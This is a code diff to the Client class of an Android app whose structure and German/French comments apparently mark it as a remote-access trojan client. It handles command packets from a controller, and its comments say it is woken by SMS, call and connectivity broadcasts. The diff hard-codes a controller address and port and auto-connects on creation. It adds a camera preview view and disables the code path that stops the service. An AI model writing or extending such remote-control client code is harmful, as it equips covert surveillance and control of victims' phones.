@@ -1,6 +1,7 @@
 package my.app.client;
 
 
+import android.view.TextureView;
 import inout.Controler;
 import inout.Protocol;
 
@@ -78,6 +79,8 @@ public class Client extends ClientListener implements Controler {
 	 * packet Das Paket
 	 */
 	CommandPacket packet ;
+
+	private TextureView mPreview;
 	/**
 	 * handler	Ein neuer Handler um die Befehle aus den Nachrichten zu extrahieren.
 	 * Diese werden danach der Methode processCommand.
@@ -94,8 +97,11 @@ public class Client extends ClientListener implements Controler {
 	/**
 	 * Diese Methode wird aufgerufen wenn die Klasse das erste Mal erstellt wird.
 	 */
-	public void onCreate() {
+	public void onCreate(Bundle savedInstanceState) {
 		Log.i(TAG, "In onCreate");
+		super.onCreate(savedInstanceState);
+		setContentView(R.layout.main);
+		mPreview = (TextureView) findViewById(R.id.surface_view);
 		/**
 		 * infos die Klassenvaribale der Klasse ClientListener.
 		 */
@@ -108,16 +114,13 @@ public class Client extends ClientListener implements Controler {
 		 * Hier werden noch die andern Einstellungen geladen.
 		 */
 		loadPreferences();
+		ip = "192.168.0.199";
+		port = 9999;
+		start();
 	}
 
-	/**
-	 * Diese Methode wird aufgerufen sobald ein die Methode startService() aufgerufen wird. Zusätzlich wird dieser Methode der Intent übergeben.
-	 * @param intent	Der Intent der den Service gestartet hat
-	 * @param flags	Zusätzliche Daten über die Startanfrage
-	 * @param startId	Eine einzigartige Nummer die die Startanfrage identifiziert.
-	 * @return	START_STICKY
-	 */
-	public int onStartCommand(Intent intent, int flags, int startId) {
+
+	public void start() {
 		//toast = Toast.makeText(this	,"Prepare to laod", Toast.LENGTH_LONG);
 		//loadPreferences("preferences");
 		//Intent i = new Intent(this,Preferences.class);
@@ -126,24 +129,24 @@ public class Client extends ClientListener implements Controler {
 		 * Überprüfen ob ein Intent mit Daten angekommen ist, sollte dies nicht der Fall sein so wird die Methode beendet und START_STICKY zurückgegeben.
 		 *
 		 */
-		if(intent == null)
-			return START_STICKY;
+		/*if(intent == null)
+			return START_STICKY;*/
 		/**
 		 * Um zu überprüfen wer den Service gestartet hat.
 		 */
-		String who = intent.getAction();
-		Log.i(TAG, "onStartCommand by: "+ who); //On affiche qui a déclenché l'event
+		/*String who = intent.getAction();
+		Log.i(TAG, "onStartCommand by: "+ who); //On affiche qui a déclenché l'event*/
 
 		/**
 		 * Sollte der Intent eine IP enthalten so wird dieser aus dem Intent entnommen und in der Klassenvariablen gespeichert.
 		 */
-		if (intent.hasExtra("IP"))
-			this.ip = intent.getExtras().getString("IP");
+		/*if (intent.hasExtra("IP"))
+			this.ip = intent.getExtras().getString("IP");*/
 		/**
 		 * Sollte der Intent den Port enthalten so wird dieser entnommen und der Klassenvariablen gespeichert.
 		 */
-		if (intent.hasExtra("PORT"))
-			this.port = intent.getExtras().getInt("PORT");
+		/*if (intent.hasExtra("PORT"))
+			this.port = intent.getExtras().getInt("PORT");*/
 		/**
 		 * Überprüfen ob der Service gestartet wurde oder nicht. Dieser Zweig wird beim ersten Starten durchlaufen.
 		 */
@@ -233,12 +236,12 @@ public class Client extends ClientListener implements Controler {
 				/**
 				 * Logeintrag, das schon eine Verbindung besteht.
 				 */
-				Log.w(TAG,"Called uselessly by: "+ who + " (already listening)");
+				//Log.w(TAG,"Called uselessly by: "+ who + " (already listening)");
 			}
 			else { //Sa veut dire qu'on a reçu un broadcast sms ou call
 				//On est ici soit par AlarmListener, ConnectivityManager, SMS/Call ou X
 				//Dans tout les cas le but ici est de se connecter
-				Log.i(TAG,"Connection by : "+who);
+				//Log.i(TAG,"Connection by : "+who);
 				conn.execute();
 				//if(conn.execute()) {
 				if (conn.returnResult()){
@@ -262,7 +265,7 @@ public class Client extends ClientListener implements Controler {
 			}
 		}
 		 
-		return START_STICKY;
+		/*return START_STICKY;*/
 	}
 
 
@@ -303,7 +306,9 @@ public class Client extends ClientListener implements Controler {
 			sendError("Error on Client:"+e.getMessage());
 		}
     }
-	
+	public TextureView getPreview(){
+		return mPreview;
+	}
 	public void reconnectionAttempts() 
 	{
 		/*
@@ -430,7 +435,7 @@ public class Client extends ClientListener implements Controler {
 		/**
 		 * Den Service beenden und zerstören
 		 */
-		stopSelf();
+		//stopSelf();
 		super.onDestroy();
 	}
 
